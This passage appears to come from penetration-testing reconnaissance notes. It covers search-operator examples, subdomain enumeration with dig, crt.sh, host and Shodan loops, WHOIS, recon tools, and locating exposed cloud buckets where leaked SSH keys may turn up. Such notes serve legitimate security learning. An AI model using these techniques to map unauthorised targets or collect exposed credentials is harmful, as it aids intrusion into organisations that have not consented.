| `OR`                    | Broadens results by including pages with any of the terms.   | `"linux" OR "ubuntu" OR "debian"`                   | Search for webpages mentioning Linux, Ubuntu, or Debian.     |
| `NOT`                   | Excludes results containing the specified term.              | `site:bank.com NOT inurl:login`                     | Find pages on bank.com excluding login pages.                |
| `*` (wildcard)          | Represents any character or word.                            | `site:socialnetwork.com filetype:pdf user* manual`  | Search for user manuals (user guide, user handbook) in PDF format on socialnetwork.com. |
| `..` (range search)     | Finds results within a specified numerical range.            | `site:ecommerce.com "price" 100..500`               | Look for products priced between 100 and 500 on an e-commerce website. |
| `" "` (quotation marks) | Searches for exact phrases.                                  | `"information security policy"`                     | Find documents mentioning the exact phrase "information security policy". |
| `-` (minus sign)        | Excludes terms from the search results.                      | `site:news.com -inurl:sports`                       | Search for news articles on news.com excluding sports-related content. |

## Domains

#### DNS Subdomains

1. Manual search:

   - **SSL certificate**

   - **DNS records** (public domain)

     To display all the available DNS records:

     ```bash
     dig any [DOMAIN]
     ```

     The records output will be divided in categories:

     - `A` records: We recognize the IP addresses that point to a specific (sub)domain. 
     - `MX` records: show which mail  server is responsible for managing the emails for the company. 
     - `NS` records: show which name servers are used to resolve the FQDN to IP addresses. Most hosting  providers use their own name servers, making it easier to identify the hosting provider.
     - `TXT` records: often contains verification keys for different third-party providers and other security aspects of DNS, such as [SPF](https://datatracker.ietf.org/doc/html/rfc7208), [DMARC](https://datatracker.ietf.org/doc/html/rfc7489), and [DKIM](https://datatracker.ietf.org/doc/html/rfc6376), which are responsible for verifying and confirming the origin of the  emails sent.

   - **Certificate Transparency (CT) logs:**  SSL certificate providers share the CT with the website https://crt.sh/, which stores everything in a database. FOr a deeper search: [Censys](https://search.censys.io/)

     Certificate Transparency (CT) is an Internet security standard for monitoring and auditing the issuance of digital certificates. When an Internet user interacts with a website, a trusted third party  is needed for assurance that the website is legitimate and that the  website's encryption key is valid.

     To look them up from the terminal and filter by unique subdomains:

     ```bash
      curl -s https://crt.sh/\?q\=[DOMAIN]\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u | tee subdomainlist.txt
     ```

     Then one can grep the ones with an IP address:

     ```bash
     for i in $(cat subdomainlist);do host $i | grep "has address" | grep [DOMAIN]| cut -d" " -f4 >> ip-addresses.txt;done
     ```

     And use [Shodan](https://www.shodan.io/) to find devices and systems permanently connected to the Internet like `Internet of Things` (`IoT`). It searches the Internet for open TCP/IP ports and filters the systems according to specific terms and criteria.

     ```bash
     for i in $(cat ip-addresses.txt);do shodan host $i;done
     ```

     Often cloud storage is added to the DNS list when used for administrative purposes by other employees. 

   - `WHOIS` (public)

     ```bash
     whois [DOMAIN]
     ```

   - [Wayback Machine](https://web.archive.org/)

     It allows users to "go back in time" and view snapshots of websites as they appeared at various points in their history.

   - Generic Domain Data

     - [Recon-ng](https://github.com/lanmaster53/recon-ng): 


       - [theHarvester](https://github.com/laramies/theHarvester): 


       - [SpiderFoot](https://github.com/smicallef/spiderfoot): 


       - [OSINT Framework](https://osintframework.com/): 

## Cloud Assets

#### Cloud

`Amazon` (`AWS`), `Google` (`GCP`), and `Microsoft` (`Azure`) 

- DNS enumeration:

  Often cloud storage is added to the DNS list when used for administrative purposes by other employees. 

- Google search:

- Third-party providers 

  -  [domain.glass](https://domain.glass) 
  -  [GrayHatWarfare](https://buckets.grayhatwarfare.com). We can do many different searches, discover AWS, Azure, and GCP cloud  storage, and even sort and filter by file format. Therefore, once we  have found them through Google, we can also search for them on  GrayHatWarefare and passively discover what files are stored on the  given cloud storage. SSH keys could be also leaked here.
